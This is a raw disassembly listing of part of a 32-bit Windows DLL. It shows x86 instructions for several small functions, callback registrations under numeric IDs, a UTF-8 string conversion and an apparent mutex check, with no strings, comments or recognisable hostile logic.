1000ca12:	75 0d                	jne    0x1000ca21
1000ca14:	ff b7 9c 03 00 00    	pushl  0x39c(%edi)
1000ca1a:	e8 a7 70 ff ff       	call   0x10003ac6
1000ca1f:	eb 0c                	jmp    0x1000ca2d
1000ca21:	ff 15 40 e1 00 10    	call   *0x1000e140
1000ca27:	89 87 f0 03 00 00    	mov    %eax,0x3f0(%edi)
1000ca2d:	5f                   	pop    %edi
1000ca2e:	5e                   	pop    %esi
1000ca2f:	5d                   	pop    %ebp
1000ca30:	c3                   	ret    
1000ca31:	55                   	push   %ebp
1000ca32:	8b ec                	mov    %esp,%ebp
1000ca34:	51                   	push   %ecx
1000ca35:	53                   	push   %ebx
1000ca36:	57                   	push   %edi
1000ca37:	68 2c 01 00 00       	push   $0x12c
1000ca3c:	ff 15 44 e1 00 10    	call   *0x1000e144
1000ca42:	8b 45 10             	mov    0x10(%ebp),%eax
1000ca45:	ff 70 08             	pushl  0x8(%eax)
1000ca48:	8b 45 0c             	mov    0xc(%ebp),%eax
1000ca4b:	8b 7d 18             	mov    0x18(%ebp),%edi
1000ca4e:	8b 98 b4 03 00 00    	mov    0x3b4(%eax),%ebx
1000ca54:	e8 c1 0e 00 00       	call   0x1000d91a
1000ca59:	5f                   	pop    %edi
1000ca5a:	33 c0                	xor    %eax,%eax
1000ca5c:	5b                   	pop    %ebx
1000ca5d:	59                   	pop    %ecx
1000ca5e:	5d                   	pop    %ebp
1000ca5f:	c3                   	ret    
1000ca60:	55                   	push   %ebp
1000ca61:	8b ec                	mov    %esp,%ebp
1000ca63:	83 ec 28             	sub    $0x28,%esp
1000ca66:	53                   	push   %ebx
1000ca67:	56                   	push   %esi
1000ca68:	57                   	push   %edi
1000ca69:	8b 7d 08             	mov    0x8(%ebp),%edi
1000ca6c:	8b d8                	mov    %eax,%ebx
1000ca6e:	8b 83 a4 03 00 00    	mov    0x3a4(%ebx),%eax
1000ca74:	8b cf                	mov    %edi,%ecx
1000ca76:	e8 ac ef ff ff       	call   0x1000ba27
1000ca7b:	33 d2                	xor    %edx,%edx
1000ca7d:	8b f0                	mov    %eax,%esi
1000ca7f:	89 55 f8             	mov    %edx,-0x8(%ebp)
1000ca82:	c7 45 f0 e4 f4 00 10 	movl   $0x1000f4e4,-0x10(%ebp)
1000ca89:	83 ff 01             	cmp    $0x1,%edi
1000ca8c:	75 07                	jne    0x1000ca95
1000ca8e:	c7 45 f0 ec f4 00 10 	movl   $0x1000f4ec,-0x10(%ebp)
1000ca95:	83 ff 02             	cmp    $0x2,%edi
1000ca98:	75 07                	jne    0x1000caa1
1000ca9a:	c7 45 f0 f0 f4 00 10 	movl   $0x1000f4f0,-0x10(%ebp)
1000caa1:	8b ce                	mov    %esi,%ecx
1000caa3:	e8 a8 ee ff ff       	call   0x1000b950
1000caa8:	85 c0                	test   %eax,%eax
1000caaa:	75 6c                	jne    0x1000cb18
1000caac:	89 55 f4             	mov    %edx,-0xc(%ebp)
1000caaf:	89 55 ec             	mov    %edx,-0x14(%ebp)
1000cab2:	83 ff 01             	cmp    $0x1,%edi
1000cab5:	75 15                	jne    0x1000cacc
1000cab7:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000caba:	50                   	push   %eax
1000cabb:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000cabe:	50                   	push   %eax
1000cabf:	68 f4 f4 00 10       	push   $0x1000f4f4
1000cac4:	e8 5e fd ff ff       	call   0x1000c827
1000cac9:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000cacc:	83 ff 02             	cmp    $0x2,%edi
1000cacf:	75 15                	jne    0x1000cae6
1000cad1:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000cad4:	50                   	push   %eax
1000cad5:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000cad8:	50                   	push   %eax
1000cad9:	68 fc f4 00 10       	push   $0x1000f4fc
1000cade:	e8 44 fd ff ff       	call   0x1000c827
1000cae3:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000cae6:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
1000caea:	74 19                	je     0x1000cb05
1000caec:	ff 75 f4             	pushl  -0xc(%ebp)
1000caef:	8b 7d ec             	mov    -0x14(%ebp),%edi
1000caf2:	e8 9d ee ff ff       	call   0x1000b994
1000caf7:	ff 75 f4             	pushl  -0xc(%ebp)
1000cafa:	e8 14 9f ff ff       	call   0x10006a13
1000caff:	8b 7d 08             	mov    0x8(%ebp),%edi
1000cb02:	59                   	pop    %ecx
1000cb03:	eb 13                	jmp    0x1000cb18
1000cb05:	68 a0 f2 00 10       	push   $0x1000f2a0
1000cb0a:	ff 75 f0             	pushl  -0x10(%ebp)
1000cb0d:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000cb13:	e8 c0 6d ff ff       	call   0x100038d8
1000cb18:	8b ce                	mov    %esi,%ecx
1000cb1a:	e8 31 ee ff ff       	call   0x1000b950
1000cb1f:	85 c0                	test   %eax,%eax
1000cb21:	74 37                	je     0x1000cb5a
1000cb23:	e8 31 ee ff ff       	call   0x1000b959
1000cb28:	85 c0                	test   %eax,%eax
1000cb2a:	75 2e                	jne    0x1000cb5a
1000cb2c:	83 ff 01             	cmp    $0x1,%edi
1000cb2f:	75 09                	jne    0x1000cb3a
1000cb31:	b8 f1 ff 00 00       	mov    $0xfff1,%eax
1000cb36:	66 89 46 10          	mov    %ax,0x10(%esi)
1000cb3a:	83 ff 02             	cmp    $0x2,%edi
1000cb3d:	75 09                	jne    0x1000cb48
1000cb3f:	b8 f2 ff 00 00       	mov    $0xfff2,%eax
1000cb44:	66 89 46 10          	mov    %ax,0x10(%esi)
1000cb48:	6a 00                	push   $0x0
1000cb4a:	ff b3 b4 03 00 00    	pushl  0x3b4(%ebx)
1000cb50:	8b fe                	mov    %esi,%edi
1000cb52:	e8 88 ee ff ff       	call   0x1000b9df
1000cb57:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000cb5a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
1000cb5e:	74 29                	je     0x1000cb89
1000cb60:	0f b7 46 10          	movzwl 0x10(%esi),%eax
1000cb64:	50                   	push   %eax
1000cb65:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cb68:	68 d4 e6 00 10       	push   $0x1000e6d4
1000cb6d:	50                   	push   %eax
1000cb6e:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000cb74:	83 c4 0c             	add    $0xc,%esp
1000cb77:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cb7a:	50                   	push   %eax
1000cb7b:	ff 75 f0             	pushl  -0x10(%ebp)
1000cb7e:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000cb84:	e8 4f 6d ff ff       	call   0x100038d8
1000cb89:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000cb8c:	5f                   	pop    %edi
1000cb8d:	5e                   	pop    %esi
1000cb8e:	5b                   	pop    %ebx
1000cb8f:	c9                   	leave  
1000cb90:	c2 04 00             	ret    $0x4
1000cb93:	51                   	push   %ecx
1000cb94:	6a 01                	push   $0x1
1000cb96:	e8 c5 fe ff ff       	call   0x1000ca60
1000cb9b:	59                   	pop    %ecx
1000cb9c:	c3                   	ret    
1000cb9d:	51                   	push   %ecx
1000cb9e:	6a 02                	push   $0x2
1000cba0:	e8 bb fe ff ff       	call   0x1000ca60
1000cba5:	59                   	pop    %ecx
1000cba6:	c3                   	ret    
1000cba7:	55                   	push   %ebp
1000cba8:	8b ec                	mov    %esp,%ebp
1000cbaa:	83 ec 28             	sub    $0x28,%esp
1000cbad:	56                   	push   %esi
1000cbae:	8b 75 14             	mov    0x14(%ebp),%esi
1000cbb1:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cbb4:	50                   	push   %eax
1000cbb5:	ff 75 10             	pushl  0x10(%ebp)
1000cbb8:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000cbbe:	ff 75 0c             	pushl  0xc(%ebp)
1000cbc1:	e8 4b 72 ff ff       	call   0x10003e11
1000cbc6:	85 c0                	test   %eax,%eax
1000cbc8:	74 28                	je     0x1000cbf2
1000cbca:	8b c6                	mov    %esi,%eax
1000cbcc:	e8 c2 ff ff ff       	call   0x1000cb93
1000cbd1:	85 c0                	test   %eax,%eax
1000cbd3:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cbd6:	74 07                	je     0x1000cbdf
1000cbd8:	68 6c f4 00 10       	push   $0x1000f46c
1000cbdd:	eb 05                	jmp    0x1000cbe4
1000cbdf:	68 68 f4 00 10       	push   $0x1000f468
1000cbe4:	6a 39                	push   $0x39
1000cbe6:	50                   	push   %eax
1000cbe7:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000cbed:	e8 14 6f ff ff       	call   0x10003b06
1000cbf2:	8b 45 18             	mov    0x18(%ebp),%eax
1000cbf5:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000cbfb:	33 c0                	xor    %eax,%eax
1000cbfd:	5e                   	pop    %esi
1000cbfe:	c9                   	leave  
1000cbff:	c2 14 00             	ret    $0x14
1000cc02:	55                   	push   %ebp
1000cc03:	8b ec                	mov    %esp,%ebp
1000cc05:	83 ec 28             	sub    $0x28,%esp
1000cc08:	56                   	push   %esi
1000cc09:	8b 75 14             	mov    0x14(%ebp),%esi
1000cc0c:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cc0f:	50                   	push   %eax
1000cc10:	ff 75 10             	pushl  0x10(%ebp)
1000cc13:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000cc19:	ff 75 0c             	pushl  0xc(%ebp)
1000cc1c:	e8 f0 71 ff ff       	call   0x10003e11
1000cc21:	85 c0                	test   %eax,%eax
1000cc23:	74 28                	je     0x1000cc4d
1000cc25:	8b c6                	mov    %esi,%eax
1000cc27:	e8 29 f4 ff ff       	call   0x1000c055
1000cc2c:	85 c0                	test   %eax,%eax
1000cc2e:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cc31:	74 07                	je     0x1000cc3a
1000cc33:	68 6c f4 00 10       	push   $0x1000f46c
1000cc38:	eb 05                	jmp    0x1000cc3f
1000cc3a:	68 68 f4 00 10       	push   $0x1000f468
1000cc3f:	6a 3d                	push   $0x3d
1000cc41:	50                   	push   %eax
1000cc42:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000cc48:	e8 b9 6e ff ff       	call   0x10003b06
1000cc4d:	8b 45 18             	mov    0x18(%ebp),%eax
1000cc50:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000cc56:	33 c0                	xor    %eax,%eax
1000cc58:	5e                   	pop    %esi
1000cc59:	c9                   	leave  
1000cc5a:	c2 14 00             	ret    $0x14
1000cc5d:	55                   	push   %ebp
1000cc5e:	8b ec                	mov    %esp,%ebp
1000cc60:	83 ec 28             	sub    $0x28,%esp
1000cc63:	56                   	push   %esi
1000cc64:	8b 75 14             	mov    0x14(%ebp),%esi
1000cc67:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cc6a:	50                   	push   %eax
1000cc6b:	ff 75 10             	pushl  0x10(%ebp)
1000cc6e:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000cc74:	ff 75 0c             	pushl  0xc(%ebp)
1000cc77:	e8 95 71 ff ff       	call   0x10003e11
1000cc7c:	85 c0                	test   %eax,%eax
1000cc7e:	74 1b                	je     0x1000cc9b
1000cc80:	68 6c f4 00 10       	push   $0x1000f46c
1000cc85:	6a 1e                	push   $0x1e
1000cc87:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cc8a:	50                   	push   %eax
1000cc8b:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000cc91:	e8 70 6e ff ff       	call   0x10003b06
1000cc96:	e8 0b 8e ff ff       	call   0x10005aa6
1000cc9b:	8b 45 18             	mov    0x18(%ebp),%eax
1000cc9e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000cca4:	33 c0                	xor    %eax,%eax
1000cca6:	5e                   	pop    %esi
1000cca7:	c9                   	leave  
1000cca8:	c2 14 00             	ret    $0x14
1000ccab:	e9 3d 4a ff ff       	jmp    0x100016ed
1000ccb0:	55                   	push   %ebp
1000ccb1:	8b ec                	mov    %esp,%ebp
1000ccb3:	83 ec 28             	sub    $0x28,%esp
1000ccb6:	56                   	push   %esi
1000ccb7:	8b 75 14             	mov    0x14(%ebp),%esi
1000ccba:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000ccbd:	50                   	push   %eax
1000ccbe:	ff 75 10             	pushl  0x10(%ebp)
1000ccc1:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000ccc7:	ff 75 0c             	pushl  0xc(%ebp)
1000ccca:	e8 42 71 ff ff       	call   0x10003e11
1000cccf:	85 c0                	test   %eax,%eax
1000ccd1:	74 29                	je     0x1000ccfc
1000ccd3:	e8 d3 ff ff ff       	call   0x1000ccab
1000ccd8:	85 c0                	test   %eax,%eax
1000ccda:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000ccdd:	74 07                	je     0x1000cce6
1000ccdf:	68 6c f4 00 10       	push   $0x1000f46c
1000cce4:	eb 05                	jmp    0x1000cceb
1000cce6:	68 68 f4 00 10       	push   $0x1000f468
1000cceb:	68 9a 02 00 00       	push   $0x29a
1000ccf0:	50                   	push   %eax
1000ccf1:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000ccf7:	e8 0a 6e ff ff       	call   0x10003b06
1000ccfc:	8b 45 18             	mov    0x18(%ebp),%eax
1000ccff:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000cd05:	33 c0                	xor    %eax,%eax
1000cd07:	5e                   	pop    %esi
1000cd08:	c9                   	leave  
1000cd09:	c2 14 00             	ret    $0x14
1000cd0c:	55                   	push   %ebp
1000cd0d:	8b ec                	mov    %esp,%ebp
1000cd0f:	83 ec 28             	sub    $0x28,%esp
1000cd12:	56                   	push   %esi
1000cd13:	8b 75 14             	mov    0x14(%ebp),%esi
1000cd16:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cd19:	50                   	push   %eax
1000cd1a:	ff 75 10             	pushl  0x10(%ebp)
1000cd1d:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000cd23:	ff 75 0c             	pushl  0xc(%ebp)
1000cd26:	e8 e6 70 ff ff       	call   0x10003e11
1000cd2b:	85 c0                	test   %eax,%eax
1000cd2d:	74 28                	je     0x1000cd57
1000cd2f:	8b c6                	mov    %esi,%eax
1000cd31:	e8 67 fe ff ff       	call   0x1000cb9d
1000cd36:	85 c0                	test   %eax,%eax
1000cd38:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000cd3b:	74 07                	je     0x1000cd44
1000cd3d:	68 6c f4 00 10       	push   $0x1000f46c
1000cd42:	eb 05                	jmp    0x1000cd49
1000cd44:	68 68 f4 00 10       	push   $0x1000f468
1000cd49:	6a 38                	push   $0x38
1000cd4b:	50                   	push   %eax
1000cd4c:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000cd52:	e8 af 6d ff ff       	call   0x10003b06
1000cd57:	8b 45 18             	mov    0x18(%ebp),%eax
1000cd5a:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000cd60:	33 c0                	xor    %eax,%eax
1000cd62:	5e                   	pop    %esi
1000cd63:	c9                   	leave  
1000cd64:	c2 14 00             	ret    $0x14
1000cd67:	55                   	push   %ebp
1000cd68:	8b ec                	mov    %esp,%ebp
1000cd6a:	51                   	push   %ecx
1000cd6b:	56                   	push   %esi
1000cd6c:	8b 75 0c             	mov    0xc(%ebp),%esi
1000cd6f:	e8 73 f1 ff ff       	call   0x1000bee7
1000cd74:	5e                   	pop    %esi
1000cd75:	59                   	pop    %ecx
1000cd76:	5d                   	pop    %ebp
1000cd77:	c2 10 00             	ret    $0x10
1000cd7a:	55                   	push   %ebp
1000cd7b:	8b ec                	mov    %esp,%ebp
1000cd7d:	81 ec 04 04 00 00    	sub    $0x404,%esp
1000cd83:	53                   	push   %ebx
1000cd84:	56                   	push   %esi
1000cd85:	8b 75 0c             	mov    0xc(%ebp),%esi
1000cd88:	e8 5a f1 ff ff       	call   0x1000bee7
1000cd8d:	8b 86 94 03 00 00    	mov    0x394(%esi),%eax
1000cd93:	e8 f4 b8 ff ff       	call   0x1000868c
1000cd98:	85 c0                	test   %eax,%eax
1000cd9a:	74 0b                	je     0x1000cda7
1000cd9c:	68 2a be 00 10       	push   $0x1000be2a
1000cda1:	56                   	push   %esi
1000cda2:	e8 bc f0 ff ff       	call   0x1000be63
1000cda7:	83 be f8 03 00 00 00 	cmpl   $0x0,0x3f8(%esi)
1000cdae:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000cdb1:	75 27                	jne    0x1000cdda
1000cdb3:	8b 86 10 03 00 00    	mov    0x310(%esi),%eax
1000cdb9:	e8 5f e8 ff ff       	call   0x1000b61d
1000cdbe:	50                   	push   %eax
1000cdbf:	68 04 f5 00 10       	push   $0x1000f504
1000cdc4:	53                   	push   %ebx
1000cdc5:	e8 d9 80 ff ff       	call   0x10004ea3
1000cdca:	85 c0                	test   %eax,%eax
1000cdcc:	74 0c                	je     0x1000cdda
1000cdce:	ff 15 40 e1 00 10    	call   *0x1000e140
1000cdd4:	89 86 f8 03 00 00    	mov    %eax,0x3f8(%esi)
1000cdda:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
1000cde0:	50                   	push   %eax
1000cde1:	e8 29 85 ff ff       	call   0x1000530f
1000cde6:	59                   	pop    %ecx
1000cde7:	6a 00                	push   $0x0
1000cde9:	6a 00                	push   $0x0
1000cdeb:	68 00 02 00 00       	push   $0x200
1000cdf0:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
1000cdf6:	50                   	push   %eax
1000cdf7:	6a ff                	push   $0xffffffff
1000cdf9:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
1000cdff:	50                   	push   %eax
1000ce00:	6a 00                	push   $0x0
1000ce02:	68 e9 fd 00 00       	push   $0xfde9
1000ce07:	ff 15 7c e0 00 10    	call   *0x1000e07c
1000ce0d:	85 c0                	test   %eax,%eax
1000ce0f:	7e 12                	jle    0x1000ce23
1000ce11:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
1000ce17:	50                   	push   %eax
1000ce18:	68 08 f5 00 10       	push   $0x1000f508
1000ce1d:	53                   	push   %ebx
1000ce1e:	e8 80 80 ff ff       	call   0x10004ea3
1000ce23:	8b c6                	mov    %esi,%eax
1000ce25:	e8 ca f2 ff ff       	call   0x1000c0f4
1000ce2a:	85 c0                	test   %eax,%eax
1000ce2c:	75 0b                	jne    0x1000ce39
1000ce2e:	68 10 f5 00 10       	push   $0x1000f510
1000ce33:	53                   	push   %ebx
1000ce34:	e8 d7 80 ff ff       	call   0x10004f10
1000ce39:	8b c6                	mov    %esi,%eax
1000ce3b:	e8 db f4 ff ff       	call   0x1000c31b
1000ce40:	85 c0                	test   %eax,%eax
1000ce42:	75 0b                	jne    0x1000ce4f
1000ce44:	68 30 f5 00 10       	push   $0x1000f530
1000ce49:	53                   	push   %ebx
1000ce4a:	e8 c1 80 ff ff       	call   0x10004f10
1000ce4f:	e8 56 f1 ff ff       	call   0x1000bfaa
1000ce54:	8b c6                	mov    %esi,%eax
1000ce56:	e8 03 f5 ff ff       	call   0x1000c35e
1000ce5b:	5e                   	pop    %esi
1000ce5c:	5b                   	pop    %ebx
1000ce5d:	c9                   	leave  
1000ce5e:	c2 0c 00             	ret    $0xc
1000ce61:	55                   	push   %ebp
1000ce62:	8b ec                	mov    %esp,%ebp
1000ce64:	51                   	push   %ecx
1000ce65:	8b 45 0c             	mov    0xc(%ebp),%eax
1000ce68:	85 c0                	test   %eax,%eax
1000ce6a:	74 13                	je     0x1000ce7f
1000ce6c:	ff 75 10             	pushl  0x10(%ebp)
1000ce6f:	68 48 f5 00 10       	push   $0x1000f548
1000ce74:	ff b0 9c 03 00 00    	pushl  0x39c(%eax)
1000ce7a:	e8 59 6a ff ff       	call   0x100038d8
1000ce7f:	59                   	pop    %ecx
1000ce80:	5d                   	pop    %ebp
1000ce81:	c3                   	ret    
1000ce82:	55                   	push   %ebp
1000ce83:	8b ec                	mov    %esp,%ebp
1000ce85:	51                   	push   %ecx
1000ce86:	51                   	push   %ecx
1000ce87:	53                   	push   %ebx
1000ce88:	56                   	push   %esi
1000ce89:	68 00 e0 00 00       	push   $0xe000
1000ce8e:	33 db                	xor    %ebx,%ebx
1000ce90:	e8 4f 9b ff ff       	call   0x100069e4
1000ce95:	59                   	pop    %ecx
1000ce96:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000ce99:	85 c0                	test   %eax,%eax
1000ce9b:	0f 84 81 00 00 00    	je     0x1000cf22
1000cea1:	8b b7 98 03 00 00    	mov    0x398(%edi),%esi
1000cea7:	50                   	push   %eax
1000cea8:	e8 5d ad ff ff       	call   0x10007c0a
1000cead:	85 c0                	test   %eax,%eax
1000ceaf:	74 68                	je     0x1000cf19
1000ceb1:	68 00 20 00 00       	push   $0x2000
1000ceb6:	e8 29 9b ff ff       	call   0x100069e4
1000cebb:	8b f0                	mov    %eax,%esi
1000cebd:	59                   	pop    %ecx
1000cebe:	85 f6                	test   %esi,%esi
1000cec0:	74 57                	je     0x1000cf19
1000cec2:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000cec5:	56                   	push   %esi
1000cec6:	e8 a2 b5 ff ff       	call   0x1000846d
1000cecb:	59                   	pop    %ecx
1000cecc:	56                   	push   %esi
1000cecd:	88 1c 30             	mov    %bl,(%eax,%esi,1)
1000ced0:	ff b7 9c 03 00 00    	pushl  0x39c(%edi)
1000ced6:	e8 83 6d ff ff       	call   0x10003c5e
1000cedb:	56                   	push   %esi
1000cedc:	e8 32 9b ff ff       	call   0x10006a13
1000cee1:	8b 75 fc             	mov    -0x4(%ebp),%esi
1000cee4:	59                   	pop    %ecx
1000cee5:	8d 9f 0c 02 00 00    	lea    0x20c(%edi),%ebx
1000ceeb:	68 80 00 00 00       	push   $0x80
1000cef0:	53                   	push   %ebx
1000cef1:	e8 51 b5 ff ff       	call   0x10008447
1000cef6:	59                   	pop    %ecx
1000cef7:	c6 84 38 0c 02 00 00 	movb   $0x0,0x20c(%eax,%edi,1)
1000cefe:	00 
1000ceff:	59                   	pop    %ecx
1000cf00:	8d 87 14 03 00 00    	lea    0x314(%edi),%eax
1000cf06:	50                   	push   %eax
1000cf07:	53                   	push   %ebx
1000cf08:	8d 47 0c             	lea    0xc(%edi),%eax
1000cf0b:	50                   	push   %eax
1000cf0c:	8b 87 9c 03 00 00    	mov    0x39c(%edi),%eax
1000cf12:	e8 7b 6e ff ff       	call   0x10003d92
1000cf17:	8b d8                	mov    %eax,%ebx
1000cf19:	ff 75 fc             	pushl  -0x4(%ebp)
1000cf1c:	e8 f2 9a ff ff       	call   0x10006a13
1000cf21:	59                   	pop    %ecx
1000cf22:	5e                   	pop    %esi
1000cf23:	8b c3                	mov    %ebx,%eax
1000cf25:	5b                   	pop    %ebx
1000cf26:	c9                   	leave  
1000cf27:	c3                   	ret    
1000cf28:	55                   	push   %ebp
1000cf29:	8b ec                	mov    %esp,%ebp
1000cf2b:	51                   	push   %ecx
1000cf2c:	56                   	push   %esi
1000cf2d:	57                   	push   %edi
1000cf2e:	8b 7d 08             	mov    0x8(%ebp),%edi
1000cf31:	85 ff                	test   %edi,%edi
1000cf33:	75 08                	jne    0x1000cf3d
1000cf35:	6a 57                	push   $0x57
1000cf37:	58                   	pop    %eax
1000cf38:	e9 67 01 00 00       	jmp    0x1000d0a4
1000cf3d:	68 00 02 00 00       	push   $0x200
1000cf42:	8d 47 0c             	lea    0xc(%edi),%eax
1000cf45:	50                   	push   %eax
1000cf46:	8b 87 98 03 00 00    	mov    0x398(%edi),%eax
1000cf4c:	e8 29 a4 ff ff       	call   0x1000737a
1000cf51:	85 c0                	test   %eax,%eax
1000cf53:	0f 84 46 01 00 00    	je     0x1000d09f
1000cf59:	8b 87 98 03 00 00    	mov    0x398(%edi),%eax
1000cf5f:	8b cf                	mov    %edi,%ecx
1000cf61:	e8 61 b2 ff ff       	call   0x100081c7
1000cf66:	85 c0                	test   %eax,%eax
1000cf68:	0f 84 31 01 00 00    	je     0x1000d09f
1000cf6e:	8b 87 98 03 00 00    	mov    0x398(%edi),%eax
1000cf74:	e8 de a8 ff ff       	call   0x10007857
1000cf79:	85 c0                	test   %eax,%eax
1000cf7b:	0f 84 1e 01 00 00    	je     0x1000d09f
1000cf81:	8b 87 98 03 00 00    	mov    0x398(%edi),%eax
1000cf87:	e8 df a8 ff ff       	call   0x1000786b
1000cf8c:	85 c0                	test   %eax,%eax
1000cf8e:	0f 84 0b 01 00 00    	je     0x1000d09f
1000cf94:	8b 87 9c 03 00 00    	mov    0x39c(%edi),%eax
1000cf9a:	e8 83 61 ff ff       	call   0x10003122
1000cf9f:	85 c0                	test   %eax,%eax
1000cfa1:	0f 84 f8 00 00 00    	je     0x1000d09f
1000cfa7:	8b 87 9c 03 00 00    	mov    0x39c(%edi),%eax
1000cfad:	e8 84 61 ff ff       	call   0x10003136
1000cfb2:	85 c0                	test   %eax,%eax
1000cfb4:	0f 84 e5 00 00 00    	je     0x1000d09f
1000cfba:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000cfc0:	57                   	push   %edi
1000cfc1:	68 83 c5 00 10       	push   $0x1000c583
1000cfc6:	6a 3a                	push   $0x3a
1000cfc8:	e8 7c 6d ff ff       	call   0x10003d49
1000cfcd:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000cfd3:	57                   	push   %edi
1000cfd4:	68 a7 cb 00 10       	push   $0x1000cba7
1000cfd9:	6a 39                	push   $0x39
1000cfdb:	e8 69 6d ff ff       	call   0x10003d49
1000cfe0:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000cfe6:	57                   	push   %edi
1000cfe7:	68 0c cd 00 10       	push   $0x1000cd0c
1000cfec:	6a 38                	push   $0x38
1000cfee:	e8 56 6d ff ff       	call   0x10003d49
1000cff3:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000cff9:	57                   	push   %edi
1000cffa:	68 02 cc 00 10       	push   $0x1000cc02
1000cfff:	6a 3d                	push   $0x3d
1000d001:	e8 43 6d ff ff       	call   0x10003d49
1000d006:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000d00c:	57                   	push   %edi
1000d00d:	68 5d cc 00 10       	push   $0x1000cc5d
1000d012:	6a 1e                	push   $0x1e
1000d014:	e8 30 6d ff ff       	call   0x10003d49
1000d019:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000d01f:	57                   	push   %edi
1000d020:	68 b0 cc 00 10       	push   $0x1000ccb0
1000d025:	68 9a 02 00 00       	push   $0x29a
1000d02a:	e8 1a 6d ff ff       	call   0x10003d49
1000d02f:	8b 8f 9c 03 00 00    	mov    0x39c(%edi),%ecx
1000d035:	57                   	push   %edi
1000d036:	68 03 c7 00 10       	push   $0x1000c703
1000d03b:	6a 29                	push   $0x29
1000d03d:	e8 07 6d ff ff       	call   0x10003d49
1000d042:	8b 87 a0 03 00 00    	mov    0x3a0(%edi),%eax
1000d048:	8b cf                	mov    %edi,%ecx
1000d04a:	e8 4e 49 ff ff       	call   0x1000199d
1000d04f:	e8 45 ec ff ff       	call   0x1000bc99
1000d054:	8b c7                	mov    %edi,%eax
1000d056:	e8 35 ee ff ff       	call   0x1000be90
1000d05b:	85 c0                	test   %eax,%eax
1000d05d:	74 40                	je     0x1000d09f
1000d05f:	e8 1e fe ff ff       	call   0x1000ce82
1000d064:	85 c0                	test   %eax,%eax
1000d066:	74 37                	je     0x1000d09f
1000d068:	8b c7                	mov    %edi,%eax
1000d06a:	e8 ef f2 ff ff       	call   0x1000c35e
1000d06f:	8d 87 14 03 00 00    	lea    0x314(%edi),%eax
1000d075:	50                   	push   %eax
1000d076:	ff b7 98 03 00 00    	pushl  0x398(%edi)
1000d07c:	e8 19 b1 ff ff       	call   0x1000819a
1000d081:	8b b7 9c 03 00 00    	mov    0x39c(%edi),%esi
1000d087:	e8 a9 68 ff ff       	call   0x10003935
1000d08c:	85 c0                	test   %eax,%eax
1000d08e:	74 0f                	je     0x1000d09f
1000d090:	8b b7 b4 03 00 00    	mov    0x3b4(%edi),%esi
1000d096:	e8 ac 0b 00 00       	call   0x1000dc47
1000d09b:	33 c0                	xor    %eax,%eax
1000d09d:	eb 05                	jmp    0x1000d0a4
1000d09f:	b8 4f 05 00 00       	mov    $0x54f,%eax
1000d0a4:	5f                   	pop    %edi
1000d0a5:	5e                   	pop    %esi
1000d0a6:	59                   	pop    %ecx
1000d0a7:	5d                   	pop    %ebp
1000d0a8:	c2 04 00             	ret    $0x4
1000d0ab:	56                   	push   %esi
1000d0ac:	68 50 f5 00 10       	push   $0x1000f550
1000d0b1:	33 f6                	xor    %esi,%esi
1000d0b3:	56                   	push   %esi
1000d0b4:	68 00 00 10 00       	push   $0x100000
1000d0b9:	ff 15 e4 e0 00 10    	call   *0x1000e0e4
1000d0bf:	3b c6                	cmp    %esi,%eax
1000d0c1:	74 08                	je     0x1000d0cb
1000d0c3:	50                   	push   %eax
1000d0c4:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d0ca:	46                   	inc    %esi
1000d0cb:	8b c6                	mov    %esi,%eax
1000d0cd:	5e                   	pop    %esi
1000d0ce:	c3                   	ret    
1000d0cf:	68 50 f5 00 10       	push   $0x1000f550
1000d0d4:	6a 01                	push   $0x1
1000d0d6:	68 78 36 01 10       	push   $0x10013678
1000d0db:	ff 15 dc e0 00 10    	call   *0x1000e0dc
